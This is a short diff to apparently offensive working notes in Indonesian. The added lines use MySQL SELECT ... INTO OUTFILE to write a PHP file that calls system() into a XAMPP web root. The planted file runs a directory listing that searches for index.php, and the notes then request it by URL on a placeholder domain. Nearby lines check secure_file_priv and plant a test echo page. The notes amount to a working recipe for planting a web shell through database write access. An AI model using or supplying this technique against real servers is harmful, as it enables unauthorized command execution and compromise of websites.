@@ -9,6 +9,19 @@ SELECT @@datadir;
 
 SHOW VARIABLES LIKE 'secure_file_priv';
 
+PEMBUKTIAN AWAL
+SELECT '<?php system("dir D:/ /s /b | findstr index.php"); ?>' 
+INTO OUTFILE 'D:/xampp/htdocs/find.php';
+https://www.dummy.co.id/find.php
+https://www.dummy.co.id/Web_Sci/public/find.php
+
+KALO GAGAL YG 2 PEMBUKTIAN AWAL
+SELECT '<?php system("dir D:/ /s /b | findstr index.php"); ?>' 
+INTO OUTFILE 'D:/xampp/htdocs/Web_Sci/public/find.php';
+panggil 
+https://www.dummy.co.id/find.php
+https://www.dummy.co.id/Web_Sci/public/find.php
+
 pembuktian dulu
 SELECT '<?php echo "erorr 4055"; ?>' 
 
